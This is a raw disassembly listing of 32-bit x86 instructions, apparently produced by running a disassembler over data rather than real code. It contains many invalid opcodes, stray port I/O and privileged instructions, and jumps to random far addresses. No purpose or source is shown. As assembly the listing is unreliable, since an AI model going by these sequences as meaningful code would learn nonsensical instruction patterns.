  417437:	imul   esp,DWORD PTR [ebx-0x42],0xf6b6733c
  41743e:	iret   
  41743f:	pop    edx
  417440:	push   esi
  417441:	push   eax
  417442:	add    esp,DWORD PTR [ecx]
  417444:	sbb    al,cl
  417446:	in     al,0xe3
  417448:	push   cs
  417449:	adc    BYTE PTR [edi+0x7cb77b3b],dh
  41744f:	push   ebx
  417450:	stos   DWORD PTR es:[edi],eax
  417451:	xchg   DWORD PTR [edx],esp
  417453:	rol    BYTE PTR [ecx],cl
  417455:	fld    TBYTE PTR [esi+0x7e]
  417458:	stc    
  417459:	fucomip st,st(2)
  41745b:	aad    0xbb
  41745d:	pop    esp
  41745e:	(bad)  
  41745f:	pop    ecx
  417460:	repnz imul ebx,DWORD PTR [esi-0x3d],0xffffff9a
  417465:	out    0x7f,eax
  417467:	lods   al,BYTE PTR ds:[esi]
  417468:	das    
  417469:	push   es
  41746a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41746b:	fidiv  DWORD PTR [edi+0x3fa3298d]
  417471:	pop    edi
  417472:	je     0x41742e
  417474:	stos   BYTE PTR es:[edi],al
  417475:	call   0xa6c0c9a
  41747a:	enter  0x977f,0x7a
  41747e:	inc    edx
  41747f:	rol    DWORD PTR [edx+0x62],1
  417482:	inc    esp
  417483:	cmp    dl,ah
  417485:	dec    ebx
  417486:	mov    edi,0x3686993
  41748b:	xor    DWORD PTR [edx],ebx
  41748d:	aas    
  41748e:	pusha  
  41748f:	cdq    
  417490:	pushf  
  417491:	fdiv   DWORD PTR [eax+0x3a]
  417494:	mov    eax,ds:0xb2d645bd
  417499:	mov    ah,0xbb
  41749b:	and    ch,BYTE PTR [edx]
  41749d:	or     al,0x12
  41749f:	mov    ch,0xf5
  4174a1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4174a3:	add    BYTE PTR [edi+edx*2-0x7dde980d],bl
  4174aa:	push   ebx
  4174ab:	jo     0x417489
  4174ad:	rcr    DWORD PTR [edi],1
  4174af:	aam    0x39
  4174b1:	adc    DWORD PTR [edi-0x27968135],ecx
  4174b7:	je     0x417453
  4174b9:	retf   0xfd9d
  4174bc:	cld    
  4174bd:	and    al,0xc5
  4174bf:	fnstcw WORD PTR [ebp+0x22]
  4174c2:	ds enter 0x79a,0xce
  4174c7:	ror    DWORD PTR [ebx-0x15],0x8e
  4174cb:	xchg   edi,eax
  4174cc:	jns    0x417471
  4174ce:	mov    edi,0x90ef3c9f
  4174d3:	int3   
  4174d4:	cmp    esp,DWORD PTR [ebp-0x5e]
  4174d7:	pop    edi
  4174d8:	push   ecx
  4174d9:	xchg   ebx,eax
  4174da:	add    bl,BYTE PTR [esi-0x65]
  4174dd:	push   esp
  4174de:	add    DWORD PTR [ecx],esi
  4174e0:	xor    ch,bl
  4174e2:	fist   DWORD PTR [ebp+0x47]
  4174e5:	stos   DWORD PTR es:[edi],eax
  4174e6:	adc    eax,0xc789dd5f
  4174eb:	jb     0x4174a4
  4174ed:	sbb    eax,0xfef2edae
  4174f2:	or     edx,DWORD PTR [ebx-0x4d]
  4174f5:	fadd   DWORD PTR [eax]
  4174f7:	mov    DWORD PTR [ecx+0x290dc95f],eax
  4174fd:	out    0xf2,eax
  4174ff:	sub    DWORD PTR [ebp-0x486f9d6c],edi
  417505:	mov    bl,0xcf
  417507:	mov    edx,0x48ba8eb5
  41750c:	(bad)  
  41750d:	xchg   esi,eax
  41750e:	or     al,0xf5
  417510:	mov    esi,DWORD PTR [edi+0x7]
  417513:	ret    0xc9c2
  417516:	pusha  
  417517:	cwde   
  417518:	push   ss
  417519:	xor    eax,0x604f9855
  41751e:	aas    
  41751f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417520:	aam    0x65
  417522:	mov    ebp,0x96f4967c
  417527:	cwde   
  417528:	push   eax
  417529:	push   ss
  41752a:	push   eax
  41752b:	outs   dx,BYTE PTR ds:[esi]
  41752c:	sbb    al,0x53
  41752e:	push   ds
  41752f:	and    al,0x2c
  417531:	adc    eax,0x85c4e14a
  417536:	sbb    eax,0xf827610c
  41753b:	push   cs
  41753c:	(bad)  
  41753d:	jmp    FWORD PTR [eax+0x6b23d74d]
  417543:	aam    0xae
  417545:	sub    al,0xc1
  417547:	pop    edi
  417548:	dec    edi
  417549:	xchg   ecx,eax
  41754a:	imul   edx,DWORD PTR [eax],0xffffffa5
  41754d:	ja     0x417553
  41754f:	sbb    BYTE PTR [esi-0x3a96b460],bh
  417555:	push   eax
  417556:	jbe    0x4175c0
  417558:	(bad)  
  417559:	pop    eax
  41755a:	(bad)  
  41755c:	push   edi
  41755d:	daa    
  41755e:	outs   dx,DWORD PTR ds:[esi]
  41755f:	pop    ebx
  417560:	(bad)  
  417562:	ret    0x36f5
  417565:	mov    eax,ds:0xa32503
  41756a:	inc    ebx
  41756b:	into   
  41756c:	and    bh,dh
  41756e:	sub    esi,ebp
  417570:	dec    esp
  417571:	inc    eax
  417572:	aaa    
  417573:	jno    0x4174f6
  417575:	stos   BYTE PTR es:[edi],al
  417576:	fld    QWORD PTR [edx]
  417579:	sub    eax,0x5677cbd
  41757e:	sar    BYTE PTR [ebp+0x4ff1fea1],cl
  417584:	jb     0x417521
  417586:	dec    edx
  417587:	gs adc eax,0x8a9d1f53
  41758d:	mov    dl,0xf2
  41758f:	fisub  WORD PTR [esi+0x2b6e70bf]
  417595:	pusha  
  417596:	rcl    DWORD PTR [esi+0xd579062],0xdf
  41759d:	xor    ah,BYTE PTR [ecx-0x6]
  4175a0:	lea    esi,[eax-0x11]
  4175a3:	jl     0x4175bc
  4175a5:	jg     0x417563
  4175a7:	adc    BYTE PTR [edx-0x2],dh
  4175aa:	fwait
  4175ab:	sub    bh,BYTE PTR [ebx]
  4175ad:	cmc    
  4175ae:	mov    ch,0x29
  4175b0:	ficom  WORD PTR [eax]
  4175b2:	adc    bl,al
  4175b4:	ret    0x486
  4175b7:	cmp    al,0x6d
  4175b9:	add    eax,0x8c8f78d1
  4175be:	jg     0x4175b3
  4175c0:	jmp    0x41756b
  4175c2:	aas    
  4175c3:	dec    ebp
  4175c4:	push   0x12
  4175c6:	xor    eax,0xdcb978d0
  4175cb:	cmp    ecx,DWORD PTR [edi-0x6a876615]
  4175d1:	std    
  4175d2:	call   0xc61723df
  4175d7:	mov    cl,0x47
  4175d9:	rcr    DWORD PTR [eax+ebp*4],cl
  4175dc:	shl    esp,cl
  4175de:	stos   BYTE PTR es:[edi],al
  4175df:	jmp    0x8977:0xe13fabb6
  4175e6:	js     0x4175b8
  4175e8:	sbb    dl,BYTE PTR [edi-0x37375130]
  4175ee:	xchg   ecx,eax
  4175ef:	mov    bl,cl
  4175f1:	shl    DWORD PTR [eax+edx*2+0x42bb92f3],0xd6
  4175f9:	pop    edx
  4175fa:	cmp    DWORD PTR [edi],ebp
  4175fc:	fnsave [ecx-0x10a8e08b]
  417602:	jmp    0x4bcabf1a
  417607:	in     eax,0x85
  417609:	gs and ch,al
  41760c:	push   ds
  41760d:	iret   
  41760e:	mov    ebp,DWORD PTR [ebp+esi*8-0x47]
  417612:	mov    eax,0x4e608877
  417617:	ror    DWORD PTR [eax-0x52dbdd26],1
  41761d:	dec    ebx
  41761e:	and    eax,0xa171d395
  417623:	inc    esp
  417624:	and    DWORD PTR [ebp-0x78097171],ebp
  41762a:	jp     0x4175c1
  41762c:	push   es
  41762d:	jmp    0x41765c
  41762f:	push   ss
  417630:	inc    esi
  417631:	ror    BYTE PTR [ecx],1
  417633:	push   edx
  417634:	dec    esi
  417635:	xor    al,0x2f
  417637:	hlt    
  417638:	push   ecx
  417639:	test   DWORD PTR [edx-0x441b4a9],edx
  41763f:	adc    ah,BYTE PTR [ebx]
  417641:	jmp    0x1230:0x7535ad20
  417648:	jge    0x4175dd
  41764a:	out    dx,eax
  41764b:	(bad)  
  41764d:	test   eax,0xbc04a133
  417652:	xor    esi,DWORD PTR [edx-0xe]
  417655:	retf   
  417656:	cdq    
  417657:	outs   dx,DWORD PTR ds:[esi]
  417658:	ja     0x4175e4
  41765a:	xchg   ebp,eax
  41765b:	add    al,0x45
  41765d:	(bad)
  417661:	mov    ds:0x208873c1,al
  417666:	xchg   esi,eax
  417667:	cs out dx,eax
  417669:	hlt    
  41766a:	fdivr  QWORD PTR [eax+edx*1-0x7e]
  41766e:	aas    
  41766f:	or     DWORD PTR [edx-0x6e399260],ecx
  417675:	cwde   
  417676:	push   ebx
  417677:	xlat   BYTE PTR ds:[ebx]
  417678:	pop    ss
  417679:	cmp    BYTE PTR [ebp+0x4285525b],bh
  41767f:	dec    esp
  417680:	fld    TBYTE PTR [esi+0x5f]
  417683:	fwait
  417684:	in     al,dx
  417685:	stos   DWORD PTR es:[edi],eax
  417686:	addr16 dec ebp
  417688:	adc    ch,dl
  41768a:	push   cs
  41768b:	xlat   BYTE PTR ds:[ebx]
  41768c:	and    esi,DWORD PTR [esi-0x23]
  41768f:	cmp    eax,0xceb6aea0
  417694:	lods   eax,DWORD PTR ds:[esi]
  417695:	aad    0x90
  417697:	jmp    0x41764b
  417699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41769a:	lea    edi,[ecx+0x47]
  41769d:	callw  0xa63d
  4176a1:	sub    bh,BYTE PTR [eax]
  4176a3:	addr16 pop ds
  4176a5:	and    ebx,0xffffff87
  4176a8:	loop   0x417663
  4176aa:	test   DWORD PTR [eax],eax
  4176ac:	jmp    0x417631
  4176ae:	lahf   
  4176af:	shr    BYTE PTR [esi+0x53402feb],1
  4176b5:	jecxz  0x417714
  4176b7:	inc    esi
  4176b8:	cmp    esp,DWORD PTR [esp+eiz*4+0x9]
  4176bc:	mov    bl,0x3
  4176be:	in     al,0xf
  4176c0:	and    ah,BYTE PTR [edi]
  4176c2:	arpl   WORD PTR [esi+0x45f46e64],bx
  4176c8:	inc    ebx
  4176c9:	xchg   DWORD PTR [ebx],eax
  4176cb:	push   edx
  4176cc:	jecxz  0x4176ce
  4176ce:	mov    ds:0x236fc34b,al
  4176d3:	sbb    ecx,DWORD PTR [ebp+0x1b7bbf02]
  4176d9:	jae    0x41769a
  4176db:	or     esi,DWORD PTR [ebx-0x5]
  4176de:	loopne 0x4176f7
  4176e0:	jb     0x4176c2
  4176e2:	push   ecx
  4176e3:	jns    0x4176e5
  4176e5:	sbb    eax,0x2a151cd9
  4176ea:	push   esi
  4176eb:	jmp    0x4ff3986e
  4176f0:	mov    edx,0x492a51a5
  4176f5:	push   esi
  4176f6:	adc    al,0xe5
  4176f8:	jle    0x41767c
  4176fa:	jbe    0x4176af
  4176fc:	inc    ecx
  4176fd:	jp     0x417741
  4176ff:	mov    ebx,0xea84fb72
  417704:	add    ebp,DWORD PTR [edi]
  417706:	or     eax,0xc2d0ba81
  41770b:	dec    edi
  41770c:	inc    ebp
  41770d:	in     al,dx
  41770e:	dec    eax
  41770f:	pusha  
  417710:	fsubr  DWORD PTR [edx+0xacc87a]
  417716:	xchg   ebp,eax
  417717:	cmc    
  417718:	aas    
  417719:	pop    ebp
  41771a:	inc    esp
  41771b:	xchg   ecx,eax
  41771c:	cmp    ch,BYTE PTR ds:0xa5c8b52a
  417722:	or     BYTE PTR [esi-0x1dcb6d0d],ch
  417728:	(bad)  
  41772a:	shl    DWORD PTR [ebp-0x59],cl
  41772d:	popf   
  41772e:	push   edi
  41772f:	pushf  
  417730:	adc    al,0xf
  417732:	out    dx,eax
  417733:	xchg   ecx,eax
  417734:	push   ebx
  417735:	daa    
  417736:	jmp    0x2956fb0e
  41773b:	add    eax,0x4f237bb7
  417740:	fisub  DWORD PTR [ebx-0x1432ad58]
  417746:	push   es
  417747:	mov    eax,DWORD PTR [ebp+eax*1+0x47]
  41774b:	(bad)
  41774f:	call   0x786354a1
  417754:	jnp    0x417755
  417756:	add    BYTE PTR [eax],bh
  417758:	pop    ecx
  417759:	push   eax
  41775a:	(bad)  
  41775b:	fdiv   QWORD PTR [edx-0x44]
  41775e:	mov    ebx,edi
  417760:	pop    di
  417762:	lods   al,BYTE PTR ds:[esi]
  417763:	inc    ebx
  417764:	sub    ebx,eax
  417766:	inc    edx
  417767:	xchg   DWORD PTR [esi-0x2b],ebx
  41776a:	cmp    ecx,edx
  41776c:	push   es
  41776d:	into   
  41776e:	add    ah,dl
  417770:	imul   ebx,DWORD PTR [eax+0x56c53d70],0xba3cbd84
  41777a:	std    
  41777b:	(bad)  
  41777c:	dec    edi
  41777d:	data16 mov BYTE PTR [edi-0x7676a99],bh
  417784:	inc    edx
  417785:	cmp    BYTE PTR [eax+ebx*8+0x43],al
  417789:	sub    cl,BYTE PTR [ecx]
  41778b:	xchg   edx,eax
  41778c:	sbb    eax,0x6c1f3770
  417791:	loop   0x41772f
  417793:	or     BYTE PTR ds:0xa638a4c1,0x2
  41779a:	loop   0x4177cb
  41779c:	pop    edi
  41779d:	jmp    0x4177ba
  41779f:	fwait
  4177a0:	sbb    DWORD PTR [eax-0x2b],edi
  4177a3:	and    ecx,ebp
  4177a5:	push   es
  4177a6:	lods   eax,DWORD PTR ds:[esi]
  4177a7:	lods   al,BYTE PTR ds:[esi]
  4177a8:	cdq    
  4177a9:	or     DWORD PTR [esi+ecx*4],edx
  4177ac:	in     al,dx
  4177ad:	sar    DWORD PTR [edi+0x77],0xdb
  4177b1:	xor    al,0xad
  4177b3:	lods   al,BYTE PTR ds:[esi]
  4177b4:	mov    edx,0x2abe80c6
  4177b9:	leave  
  4177ba:	leave  
  4177bb:	cmp    eax,0xfc2f6bbd
  4177c0:	jl     0x4177e3
  4177c2:	mov    al,ds:0x923d580
  4177c7:	stos   BYTE PTR es:[edi],al
  4177c8:	dec    esp
  4177c9:	cs aaa 
  4177cb:	or     eax,0xcb55c276
  4177d0:	stos   BYTE PTR es:[edi],al
  4177d1:	pushf  
  4177d2:	call   0xd6fb5961
  4177d7:	jg     0x4177c2
  4177d9:	xchg   edx,eax
  4177da:	dec    eax
  4177db:	sub    eax,0xe3324145
  4177e0:	in     al,dx
  4177e1:	jb     0x4177e6
  4177e3:	push   ss
  4177e4:	fimul  WORD PTR [edx-0x6b]
  4177e7:	test   al,0x75
  4177e9:	sub    cl,0xf8
  4177ec:	add    DWORD PTR [edi],ecx
  4177ee:	sub    bh,BYTE PTR [esi-0x2b3eec0e]
  4177f4:	add    eax,0x31c33484
  4177f9:	cmp    eax,0x9ce083ac
  4177fe:	cs pop esi
  417800:	pop    edi
  417801:	test   al,0x66
  417803:	pop    esi
  417804:	(bad)  
  417806:	mov    esi,ebp
  417808:	push   esi
  417809:	js     0x417860
  41780b:	jle    0x4177b8
  41780d:	jb     0x417831
  41780f:	ror    DWORD PTR [ebp+eax*1-0x1c76d512],0x6e
  417817:	inc    edx
  417818:	in     al,0x6
  41781a:	or     ch,BYTE PTR [edi-0x5e1adeea]
  417820:	mov    cl,0xfb
  417822:	dec    ebx
  417823:	mov    ds:0x301e9f32,al
  417828:	jmp    0x4177ef
  41782a:	and    cl,bl
  41782c:	loop   0x4178a6
  41782e:	std    
  41782f:	fldenv [ebx-0x49]
  417832:	ins    BYTE PTR es:[edi],dx
  417833:	cld    
  417834:	jbe    0x417856
  417836:	aaa    
  417837:	lahf   
  417838:	cld    
  417839:	sahf   
  41783a:	add    BYTE PTR [ecx+0x762c6f70],bl
  417840:	pusha  
  417841:	out    dx,al
  417842:	cmp    BYTE PTR [eax],al
  417844:	mov    ecx,DWORD PTR [eax+0x7e4181cc]
  41784a:	(bad)  
  41784b:	fstp   QWORD PTR [esi+edi*8+0x44f0d092]
  417852:	xchg   esp,eax
  417853:	mov    eax,gs:0x2d31e6f6
  417859:	shl    BYTE PTR ds:0x5c0f83b4,0x1c
  417860:	popf   
  417861:	loop   0x417896
  417863:	jnp    0x4177e5
  417865:	pushf  
  417866:	xor    BYTE PTR [esi],ah
  417868:	and    cl,BYTE PTR [edx]
  41786a:	stc    
  41786b:	pop    ds
  41786c:	sub    al,0x2c
  41786e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41786f:	mov    ds,WORD PTR [edi+ebx*2-0x1d9f7fa9]
  417876:	ja     0x417821
  417878:	ret    
  417879:	push   0x10
  41787b:	popa   
  41787c:	inc    eax
  41787d:	call   0xdcffe5f5
  417882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417883:	ja     0x4178a4
  417885:	push   eax
  417886:	sbb    DWORD PTR [edx+0x1b],esi
  417889:	loope  0x4178b5
  41788b:	push   edx
  41788c:	repz call 0x20864e13
  417892:	imul   esp,edi,0x8dfe47e4
  417898:	je     0x4178a9
  41789a:	mov    esi,0x10427592
  41789f:	les    eax,FWORD PTR [ebp-0x6c]
  4178a2:	xchg   edi,eax
  4178a3:	or     ebx,edx
  4178a5:	jecxz  0x41784e
  4178a7:	mov    esi,DWORD PTR [ebp+0x244a64ab]
  4178ad:	pop    esi
  4178ae:	out    dx,al
  4178af:	mov    WORD PTR [eax+ecx*8],?
  4178b2:	jg     0x41786e
  4178b4:	dec    eax
  4178b5:	mov    ch,0x75
  4178b8:	ss inc edx
  4178ba:	xchg   esi,eax
  4178bb:	sub    al,0xb2
  4178bd:	sbb    bl,BYTE PTR [edx]
  4178bf:	lds    ecx,FWORD PTR [edi-0x4c]
  4178c2:	push   esi
  4178c3:	cmp    BYTE PTR [ebx-0x4d],cl
  4178c6:	test   ch,0xd0
  4178c9:	cmc    
  4178ca:	or     BYTE PTR [ebp+0x28527e55],bh
  4178d0:	and    eax,0x3b744be7
  4178d5:	inc    ebx
  4178d6:	int    0xe4
  4178d8:	sahf   
  4178d9:	lea    ecx,[esi-0x3f74d554]
  4178df:	push   0xdb4e6696
  4178e4:	pusha  
  4178e5:	xor    ah,0xf6
  4178e8:	sub    ebx,eax
  4178ea:	mov    al,ds:0x5b4dc6e6
  4178ef:	mov    al,0xd0
  4178f1:	clc    
  4178f2:	xor    ebx,DWORD PTR [eax+eax*1]
  4178f5:	xchg   ebx,eax
  4178f6:	sub    eax,0x9bb54d5a
  4178fb:	push   ecx
  4178fc:	sahf   
  4178fd:	xor    eax,0xaf7c6db5
  417902:	(bad)  
  417904:	mov    WORD PTR gs:0xa78130cb,?
  41790b:	and    BYTE PTR [edx+0x54],dl
  41790e:	sbb    ah,bh
  417910:	sub    ah,ch
  417912:	add    bh,BYTE PTR [ebx+0x38]
  417915:	repnz ins BYTE PTR es:[edi],dx
  417917:	mov    edx,0x618ed819
  41791c:	or     eax,0x8066c9b4
  417921:	dec    edx
  417922:	aam    0x4f
  417924:	(bad)  
  417925:	mov    al,ds:0x4a9c078f
  41792a:	inc    ecx
  41792b:	shl    BYTE PTR [esi+ebp*1-0x34],cl
  41792f:	fwait
  417930:	cmp    ebx,ecx
  417932:	scas   eax,DWORD PTR es:[edi]
  417933:	sar    eax,1
  417935:	int3   
  417936:	push   eax
  417937:	aam    0x1f
  417939:	fimul  WORD PTR [ebx+0x17d58c15]
  41793f:	hlt    
  417940:	js     0x417926
  417942:	or     BYTE PTR [ebx-0x6d0dd890],cl
  417948:	pop    DWORD PTR [esi]
  41794a:	jmp    0x35635d19
  41794f:	adc    cl,BYTE PTR [ebp-0xc2b0d35]
  417955:	aaa    
  417956:	jbe    0x41796f
  417958:	adc    edi,DWORD PTR [eax]
  41795a:	jne    0x4179bb
  41795c:	sbb    eax,0x66aec3c8
  417961:	xchg   ebp,eax
  417962:	xchg   ecx,eax
  417963:	call   0xdc6bbbb7
  417968:	in     eax,0xa0
  41796a:	inc    ecx
  41796b:	arpl   WORD PTR [esi+0x39074cf6],si
  417971:	xchg   ecx,eax
  417972:	mov    eax,0xb5b8cb90
  417977:	ds jae 0x417962
  41797a:	(bad)  [ebp-0x6104f49b]
  417980:	xchg   DWORD PTR [edx+0x661e035b],ebp
  417986:	or     DWORD PTR [eax+0x3c],esp
  417989:	fucomi st,st(0)
  41798b:	mov    al,ds:0xf0578b49
  417990:	dec    esp
  417991:	jns    0x4179d3
  417993:	jl     0x417945
  417995:	cmp    al,0xb7
  417997:	hlt    
  417998:	push   ds
  417999:	pop    ebp
  41799a:	xchg   esi,eax
  41799b:	lea    ebp,[edx-0x71]
  41799e:	cwde   
  41799f:	mov    ebx,0xceace95e
  4179a4:	test   BYTE PTR ss:[esi-0x6],0x51
  4179a9:	xchg   ebx,eax
  4179aa:	ins    DWORD PTR es:[edi],dx
  4179ab:	lods   al,BYTE PTR ds:[esi]
  4179ac:	iret   
  4179ad:	popf   
  4179ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179af:	lahf   
  4179b0:	fs test eax,0xd63a2c1b
  4179b6:	mov    bh,0x2e
  4179b8:	shl    BYTE PTR [edi],0x21
  4179bb:	mov    edx,0xe9a10569
  4179c0:	bound  edi,QWORD PTR [edi-0x342a4ef5]
  4179c6:	mov    edx,0xd228a5cd
  4179cb:	fimul  DWORD PTR ss:[esi-0x54]
  4179cf:	test   DWORD PTR [di+0x1e],edx
  4179d3:	mov    cl,0x6f
  4179d5:	je     0x417a19
  4179d7:	test   ebp,esp
  4179d9:	sub    BYTE PTR [edx],dh
  4179db:	rol    DWORD PTR [ebx+0x5a],1
  4179de:	ret    
  4179df:	mov    ah,0x87
  4179e1:	dec    edi
  4179e2:	push   DWORD PTR [ebx]
  4179e4:	cmc    
  4179e5:	jecxz  0x4179dd
  4179e7:	fs mov esp,eax
  4179ea:	pop    edx
  4179eb:	fisub  WORD PTR [edx+0x1b31d365]
  4179f1:	or     al,0x88
  4179f3:	addr16 jbe 0x417a21
  4179f6:	pusha  
  4179f7:	jmp    0x4179c9
  4179f9:	sar    BYTE PTR [edi+0x16],0xb1
  4179fd:	popf   
  4179fe:	inc    edx
  4179ff:	push   0x56fae727
  417a04:	in     eax,0xc6
  417a06:	inc    eax
  417a07:	jne    0x417a6b
  417a09:	adc    ebp,DWORD PTR [esi+eiz*2+0x54]
  417a0d:	cs add eax,0xc1dcb551
  417a13:	mov    ebp,eax
  417a15:	pop    edi
  417a16:	mov    ecx,ds
  417a18:	xchg   ebp,eax
  417a19:	(bad)  [ebx+0x6]
  417a1c:	push   eax
  417a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a1e:	ja     0x4179a1
  417a20:	fwait
  417a21:	stc    
  417a22:	and    eax,0x6e309dae
  417a27:	or     al,0x89
  417a29:	je     0x417a63
  417a2b:	(bad)  [ebx-0x3fd109e2]
  417a31:	cmp    esp,edi
  417a33:	mov    esp,0xfa5ffd3
  417a38:	daa    
  417a39:	sub    bl,BYTE PTR [edi]
  417a3b:	xor    ch,ch
  417a3d:	lods   al,BYTE PTR ds:[esi]
  417a3e:	repnz dec ebx
  417a40:	je     0x417a76
  417a42:	sbb    eax,0xa7e9117e
  417a47:	clc    
  417a48:	data16 jecxz 0x4179fb
  417a4b:	cmp    eax,0xa437a2e9
  417a50:	jecxz  0x4179ee
  417a52:	xchg   esi,ebx
  417a54:	(bad)  
  417a55:	sbb    edx,edx
  417a57:	bound  edx,QWORD PTR ds:0xc837d0e1
  417a5d:	ja     0x417a4a
  417a5f:	push   esi
  417a60:	add    ebx,esi
  417a62:	test   al,0xff
  417a64:	jbe    0x417a08
  417a66:	fld    DWORD PTR [edx+0x3dee96d0]
  417a6c:	leave  
  417a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a6e:	ret    
  417a6f:	lods   al,BYTE PTR ds:[esi]
  417a70:	std    
  417a71:	add    al,0x11
  417a73:	enter  0xa31c,0x35
  417a77:	jo     0x417ae8
  417a79:	xlat   BYTE PTR ds:[ebx]
  417a7a:	into   
  417a7b:	mov    esi,0x51e71a6e
  417a80:	xchg   edi,eax
  417a81:	inc    esp
  417a82:	push   esi
  417a83:	ja     0x417a72
  417a85:	hlt    
  417a86:	iret   
  417a87:	or     cl,BYTE PTR [edx+0x3e0cc801]
  417a8d:	jmp    0xd1d8:0xd9792b7c
  417a94:	lock int3 
  417a96:	loop   0x417a81
  417a98:	pop    ecx
  417a99:	adc    al,0x11
  417a9b:	jae    0x417ae8
  417a9d:	mov    ebx,0xb7192368
  417aa2:	mov    ecx,0x516b670f
  417aa7:	(bad)  
  417aa8:	mov    ah,0x51
  417aaa:	jmp    0x5d10:0xbe70c90
  417ab1:	xor    eax,0x31a5148c
  417ab6:	mov    ds:0x51eecbe0,eax
  417abb:	or     eax,0xc4721e21
  417ac0:	pop    edx
  417ac1:	xor    DWORD PTR [ecx+0x61],edi
  417ac4:	loopne 0x417aa6
  417ac6:	loope  0x417b11
  417ac8:	xor    bh,BYTE PTR [esi+edi*4+0x7d]
  417acc:	rcl    BYTE PTR [edi-0x1d],1
  417acf:	rdpmc  
  417ad1:	cmp    al,0xe6
  417ad3:	xchg   edx,eax
  417ad4:	je     0x417a6c
  417ad6:	fstp   DWORD PTR [esi-0x45]
  417ad9:	js     0x417b04
  417adb:	popf   
  417adc:	sbb    DWORD PTR [edx],edx
  417ade:	xchg   ebp,eax
  417adf:	add    al,0x85
  417ae1:	int3   
  417ae2:	cld    
  417ae3:	cmp    DWORD PTR [edx],edi
  417ae5:	stos   DWORD PTR es:[edi],eax
  417ae6:	les    eax,FWORD PTR [esi]
  417ae8:	push   cs
  417ae9:	out    dx,al
  417aea:	scas   eax,DWORD PTR es:[edi]
  417aeb:	inc    esi
  417aec:	lods   al,BYTE PTR ds:[esi]
  417aed:	out    dx,eax
  417aee:	sub    eax,0x474ed6a5
  417af3:	jl     0x417b54
  417af5:	sbb    al,0x1e
  417af7:	test   eax,0x654cb7ea
  417afc:	ja     0x417ada
  417afe:	stos   BYTE PTR es:[edi],al
  417aff:	fldenv [edi-0x4b]
  417b02:	mov    DWORD PTR [ebx+0x7],ebx
  417b05:	cli    
  417b06:	or     BYTE PTR [eax],ch
  417b08:	jle    0x417b80
  417b0a:	xchg   edi,eax
  417b0b:	pop    ebx
  417b0c:	dec    ebp
  417b0d:	sub    al,BYTE PTR [esi]
  417b0f:	js     0x417b37
  417b11:	bound  ebx,QWORD PTR [edx]
  417b13:	xchg   ecx,eax
  417b14:	sar    DWORD PTR ds:0x92e51ace,1
  417b1a:	int3   
  417b1b:	mov    esp,0x308b4798
  417b20:	or     cl,BYTE PTR [ecx]
  417b22:	fidiv  DWORD PTR [ecx-0x5c]
  417b25:	les    esp,FWORD PTR ds:0x921ebb5b
  417b2b:	(bad)  
  417b2c:	(bad)  
  417b2d:	gs sub eax,0x8e8810d3
  417b33:	(bad)  
  417b34:	shr    BYTE PTR [esi+0x9],cl
  417b37:	pop    ebx
  417b38:	mov    DWORD PTR [eax],ecx
  417b3a:	call   0x8f9d:0x92dca20d
  417b41:	cmp    DWORD PTR [ecx],ebp
  417b43:	mov    al,0x12
  417b45:	lock add eax,0x375d1169
  417b4b:	mov    ecx,0x9c5e47cc
  417b50:	mov    ebx,0x2a7aebe6
  417b55:	cmp    ebp,DWORD PTR [eax+edi*2+0x4db00d47]
  417b5c:	mov    esi,0xf47f2389
  417b61:	or     al,0x7b
  417b63:	inc    ecx
  417b64:	iret   
  417b65:	in     eax,0x57
  417b67:	fbld   TBYTE PTR ds:0x7299a3ee
  417b6d:	xor    BYTE PTR es:[esi-0x31],ch
  417b71:	in     eax,0x58
  417b73:	call   0x9066:0x285c7789
  417b7a:	clc    
  417b7b:	ret    0xd93c
  417b7e:	ss xchg esp,eax
  417b80:	jle    0x417b07
  417b82:	pop    ds
  417b83:	mov    ds:0x395167bc,al
  417b88:	sbb    BYTE PTR [ecx],ch
  417b8a:	scas   al,BYTE PTR es:[edi]
  417b8b:	mov    bh,0x1d
  417b8d:	loopne 0x417bac
  417b8f:	ffreep st(3)
  417b91:	sahf   
  417b92:	and    ecx,ebp
  417b94:	out    dx,al
  417b95:	out    0xf6,al
  417b97:	in     al,0x77
  417b99:	ret    
  417b9a:	mov    bl,0xc
  417b9c:	pop    edx
  417b9d:	imul   BYTE PTR [ebp+0x5cca11a7]
  417ba3:	js     0x417c21
  417ba5:	sahf   
  417ba6:	xchg   ebp,eax
  417ba7:	xchg   esi,eax
  417ba8:	(bad)
  417bad:	dec    esi
  417bae:	push   ss
  417baf:	and    cl,ah
  417bb1:	inc    ecx
  417bb2:	test   al,0xfa
  417bb4:	pop    ecx
  417bb5:	stc    
  417bb6:	sar    DWORD PTR [edx+0x5ef210bc],cl
  417bbc:	call   FWORD PTR [ecx]
  417bbe:	or     al,0x76
  417bc0:	jbe    0x417b74
  417bc2:	pop    ds
  417bc3:	mov    ebx,0x3a00df3f
  417bc8:	(bad)  
  417bc9:	ret    0x7da2
  417bcc:	and    eax,0xe3f545d8
  417bd1:	mov    cl,0xfd
  417bd3:	ins    BYTE PTR es:[edi],dx
  417bd4:	aaa    
  417bd5:	sbb    BYTE PTR ds:0xa2e5c80d,ch
  417bdb:	ret    
  417bdc:	inc    edi
  417bdd:	in     al,0x3
  417bdf:	ja     0x417c53
  417be1:	xchg   esi,eax
  417be2:	pop    ecx
  417be3:	push   ecx
  417be4:	or     DWORD PTR [ebp+0x70],ebp
  417be7:	pop    ds
  417be8:	fsub   DWORD PTR [esi+0x549ca8]
  417bee:	xchg   DWORD PTR [eax+0x5d],esi
  417bf1:	inc    eax
  417bf2:	cwde   
  417bf3:	aas    
  417bf4:	push   ebp
  417bf5:	dec    ebp
  417bf6:	call   0xac32:0xe944f2b2
  417bfd:	dec    esp
  417bfe:	int    0xa2
  417c00:	pop    ecx
  417c01:	dec    esi
  417c02:	std    
  417c03:	mov    esp,0x8ff59753
  417c08:	das    
  417c09:	pop    eax
  417c0b:	ds xchg ebx,eax
  417c0d:	pop    ebx
  417c0e:	jbe    0x417bb0
  417c10:	ror    BYTE PTR [esi],0x55
  417c13:	mov    dh,0x36
  417c15:	push   esp
